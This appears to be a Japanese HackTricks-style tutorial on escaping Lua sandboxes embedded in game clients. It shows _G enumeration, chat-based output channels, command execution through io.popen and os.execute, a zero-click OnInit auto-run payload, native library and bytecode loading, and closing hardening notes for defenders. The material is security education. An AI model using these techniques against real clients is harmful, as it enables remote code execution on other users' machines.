# Lua sandbox の bypass（embedded VM、game client）

{{#include ../../../banners/hacktricks-training.md}}

このページでは、アプリケーション（特に game client、plugin、アプリ内 scripting engine）に組み込まれた Lua「sandbox」を列挙し、突破するための実践的な手法をまとめます。多くの engine は制限された Lua 環境を公開しますが、強力な global への到達経路を残しているため、任意の command execution や、bytecode loader が公開されている場合には native memory corruption さえ可能になります。

主なポイント:
- VM を未知の環境として扱い、_G を列挙して、到達可能な危険な primitive を見つける。
- stdout/print がブロックされている場合は、VM 内の UI/IPC channel を output sink として悪用し、結果を確認する。
- io/os が公開されていれば、直接 command execution（io.popen、os.execute）が可能なことが多い。
- load/loadstring/loadfile が公開されていれば、細工した Lua bytecode を実行することで、一部の version では memory safety を破壊できる（≤5.1 では verifier を bypass 可能、5.2 では verifier が削除済み）。これにより高度な exploitation が可能になる。

## sandbox 環境を列挙する

- global environment を dump して、到達可能な table/function を一覧化する:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- print() が利用できない場合は、VM 内のチャネルを転用します。サウンド呼び出し後にのみチャット出力が機能する MMO のハウジングスクリプト VM の例では、以下のように信頼性の高い出力関数を構築します。<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
このパターンを対象に合わせて一般化してください。文字列を受け付ける textbox、toast、logger、または UI callback は、reconnaissance 用の stdout として機能します。

## io/os が公開されている場合の直接的なコマンド実行

sandbox が標準ライブラリの io または os を引き続き公開している場合、すぐに command execution が可能である可能性が高いです：
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
注記：

- 実行はクライアントプロセス内で行われるため、外部デバッガーをブロックする多くのアンチチート／アンチデバッグ層でも、VM内でのプロセス作成は防げません。
- 次の項目も確認してください：package.loadlib（任意のDLL/.so読み込み）、native modulesを使用したrequire、LuaJITのffi（存在する場合）、およびdebug library（VM内で権限を昇格させられる可能性があります）。

## auto-run callbacksによるゼロクリックトリガー

ホストアプリケーションがクライアントにスクリプトをプッシュし、VMがauto-run hooks（例：OnInit/OnLoad/OnEnter）を公開している場合は、スクリプトの読み込み直後にドライブバイ侵害を実行できるよう、そこにpayloadを配置します:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
同等の callback（OnLoad、OnEnter など）は、script が client に自動的に送信・実行される場合にこの technique を一般化します。

## recon 中に探すべき危険な primitive

_G の enumeration 中に、特に以下を探します。
- io、os: io.popen、os.execute、file I/O、env access。
- load、loadstring、loadfile、dofile: source または bytecode を実行します。信頼できない bytecode の loading に対応します。
- package、package.loadlib、require: dynamic library loading と module surface。
- debug: setfenv/getfenv（≤5.1）、getupvalue/setupvalue、getinfo、および hooks。
- LuaJIT のみ: ffi.cdef、ffi.load により native code を直接呼び出します。

最小限の使用例（到達可能な場合）:

Lua の loader API は version によって変更されています。Lua 5.1 では、`load` は reader function から読み込み、`loadstring` は string から読み込みます。Lua 5.2 の `load` は string または reader function のいずれかを受け付け、`loadstring` はその equivalent として deprecated です。<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## オプションの権限昇格: Lua bytecode loaders の悪用

load/loadstring/loadfile に到達可能で、io/os が制限されている場合、細工した Lua bytecode の実行によってメモリ開示およびメモリ破壊プリミティブにつながる可能性があります。主な事実:
- Lua ≤ 5.1 には、既知の bypass が存在する bytecode verifier が組み込まれていました。<sup>[[4]](#references)</sup>
- Lua 5.2 では verifier が完全に削除されました（公式見解: アプリケーション側で precompiled chunk を拒否すべき）。そのため、bytecode loading が禁止されていない場合、attack surface が拡大します。<sup>[[2]](#references)[[3]](#references)</sup>
- 一般的なワークフローは、VM 内の出力を介してポインタを leak し、type confusion（FORLOOP やその他の opcode 周辺など）を作り出す bytecode を細工し、その後 arbitrary read/write または native code execution に pivot するというものです。<sup>[[2]](#references)[[4]](#references)</sup>

この経路は engine/version-specific であり、RE が必要です。詳細な分析、exploit primitives、ゲームにおける example gadgetry については references を参照してください。

## Detection and hardening notes (for defenders)

- Server side: user scripts を reject または rewrite し、安全な API を allowlist し、io、os、load/loadstring/loadfile/dofile、package.loadlib、debug、ffi を strip または bind-empty します。
- Client side: 最小限の _ENV で Lua を実行し、bytecode loading を禁止し、strict な bytecode verifier または signature checks を再導入し、client process からの process creation を block します。
- Telemetry: script load の直後に発生した gameclient → child process creation を alert し、UI/chat/script events と correlate します。

## References

- [1] [This House is Haunted: AION client（housing Lua VM）における10年前の RCE](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: Factorio の Lua Security Flaws を解明する](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): bytecode verifier の廃止に関する Discussion](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Lua 5.1 bytecode の Exploiting（verifier bypasses/notes 付き gist）](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Lua 5.1 Reference Manual](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Lua 5.2 Reference Manual](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
